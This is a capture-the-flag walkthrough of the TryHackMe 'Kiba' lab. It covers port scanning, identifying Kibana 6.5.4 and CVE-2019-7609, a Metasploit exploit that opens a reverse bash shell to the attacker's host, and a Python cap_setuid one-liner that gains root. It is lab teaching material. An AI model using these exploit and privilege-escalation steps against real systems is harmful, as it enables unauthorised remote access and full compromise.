---

Name: Kiba
Difficulty: Easy
URL: https://tryhackme.com/room/kiba
Description: Identify the critical security flaw in the data visualization dashboard, that allows execute remote code execution.

---

# What is the vulnerability that is specific to programming languages with prototype-based inheritance?

```text
Prototype pollution
```

# What is the version of the visualization dashboard installed on the server?

First, I performed a full port scan using RustScan:

```bash
$ rustscan -a kiba.thm -r 1-65535 --ulimit 5000 -- -sC -sV

Open 10.113.144.79:22
Open 10.113.144.79:80
Open 10.113.144.79:5044
Open 10.113.144.79:5601
```

## Visiting the website on port 80

I first enumerated the web server with Gobuster:

```bash
$ gobuster dir -url http://kiba.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 100 -x txt,php,html,bak,zip,log,old,js -k

index.html           (Status: 200) [Size: 1291]
```

There wasn't anything particularly interesting to enumerate further.

Visiting the website reveals some ASCII art along with a message about **Linux capabilities**:

```text
		     ,+++77777++=:,                    +=                      ,,++=7++=,,
		    7~?7   +7I77 :,I777  I          77 7+77 7:        ,?777777??~,=+=~I7?,=77 I
		=7I7I~7  ,77: ++:~+777777 7     +77=7 =7I7     ,I777= 77,:~7 +?7, ~7   ~ 777?
		77+7I 777~,,=7~  ,::7=7: 7 77   77: 7 7 +77,7 I777~+777I=   =:,77,77  77 7,777,
		  = 7  ?7 , 7~,~  + 77 ?: :?777 +~77 77? I7777I7I7 777+77   =:, ?7   +7 777?
		      77 ~I == ~77=77777~: I,+77?  7  7:?7? ?7 7 7 77 ~I   7I,,?7 I77~
		       I 7=77~+77+?=:I+~77?     , I 7? 77 7   777~ +7 I+?7  +7~?777,77I
		         =77 77= +7 7777         ,7 7?7:,??7     +7    7   77??+ 7777,
		             =I, I 7+:77?         +7I7?7777 :             :7 7
		                7I7I?77 ~         +7:77,     ~         +7,::7   7
		               ,7~77?7? ?:         7+:77           77 :7777=
		                ?77 +I7+,7         7~  7,+7  ,?       ?7?~?777:
		                   I777=7777 ~     77 :  77 =7+,    I77  777
		                     +      ~?     , + 7    ,, ~I,  = ? ,
		                                    77:I+
		                                    ,7
		                                     :777
		                                        :
				Welcome, "linux capabilities" is very interesting.
```

The message about Linux capabilities is a useful hint for later in the room.

## Visiting the application on port 5601

Port `5601` hosts the visualization dashboard, **Kibana**.

Visiting:

```text
http://kiba.thm:5601
```

shows the Kibana welcome page.

I found the installed version by looking at the page source:

```text
version:'6.5.4'
```

# What is the CVE number for this vulnerability?

Searching for vulnerabilities affecting Kibana `6.5.4` leads to:

```text
CVE-2019-7609
```

This vulnerability involves prototype pollution in Kibana's Timelion functionality and can ultimately be used for remote code execution.

# Compromise the machine and locate user.txt

## Metasploit

Metasploit has a module specifically targeting the Kibana Timelion prototype pollution vulnerability.

I searched for Kibana-related modules:

```bash
msfconsole

msf > search kibana

Matching Modules
================

   #  Full Name                                                   Disclosure Date  Rank    Check  Name
   -  ---------                                                   ---------------  ----    -----  ----
   0  exploit/linux/http/kibana_timelion_prototype_pollution_rce  2019-10-30       manual  Yes    Kibana Timelion Prototype Pollution RCE
   1  exploit/linux/http/kibana_upgrade_assistant_telemetry_rce   2020-04-17       manual  Yes    Kibana Upgrade Assistant Telemetry Collector Prototype Pollution
   2    \_ target: ELASTIC                                        .                 .      .      .
   3    \_ target: KIBANA                                         .                 .      .      .
```

I selected the Timelion prototype pollution exploit:

```bash
msf > use 0
```

Then I checked the available options:

```bash
msf exploit(linux/http/kibana_timelion_prototype_pollution_rce) > options

Module options (exploit/linux/http/kibana_timelion_prototype_pollution_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported
                                        proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      5601             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The URI of the Kibana Application
   VHOST                       no        HTTP server virtual host

Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

I set the target host and my VPN interface as the local host:

```bash
msf exploit(linux/http/kibana_timelion_prototype_pollution_rce) > set RHOSTS kiba.thm
RHOSTS => kiba.thm

msf exploit(linux/http/kibana_timelion_prototype_pollution_rce) > set LHOST tun0
LHOST => 192.168.130.165

msf exploit(linux/http/kibana_timelion_prototype_pollution_rce) > run
```

The exploit gives me a shell on the target.

I verified the current user:

```bash
$ id
uid=1000(kiba) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```

I then searched the filesystem for `user.txt`:

```bash
$ find / -name "user.txt" 2> /dev/null
/home/kiba/user.txt
```

The user flag is therefore located at:

```text
/home/kiba/user.txt
```

# How would you recursively list all of these capabilities?

The hint from the website mentioned Linux capabilities.

The `getcap` command can recursively search for files with capabilities:

```bash
getcap -r /
```

I redirected errors to `/dev/null` because the command produces a large number of permission-denied messages:

```bash
$ getcap -r / 2> /dev/null

/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```

The interesting entry is:

```text
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
```

`cap_setuid` allows the process to change its UID. Since this Python binary has the capability set with the effective and permitted flags (`+ep`), it can be abused to obtain a root shell.

# Escalate privileges and obtain root.txt

I found a privilege-escalation technique using `cap_setuid` on Python [here](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/).

Using the Python binary with the `cap_setuid` capability:

```bash
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

I then verified that the shell was running as root:

```bash
id

uid=0(root) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```

The `uid=0(root)` confirms that the privilege escalation was successful.

I could then locate and read `root.txt` from the root user's directory.
